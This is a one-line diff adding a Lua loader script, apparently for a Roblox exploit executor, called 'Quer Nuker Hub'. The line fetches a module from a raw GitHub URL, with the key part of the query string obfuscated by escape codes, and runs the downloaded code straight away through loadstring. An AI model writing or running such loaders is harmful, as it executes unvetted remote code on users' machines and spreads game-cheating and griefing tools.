@@ -1,0 +1,1 @@
+getgenv().mainKey = "nil" local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://raw.githubusercontent.com/Ghsstx/Quer-Nuker-Hub-3.5-/main/Main%20Module"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["Premium_Verify"]="QuerNukerHub"}}).Body)()
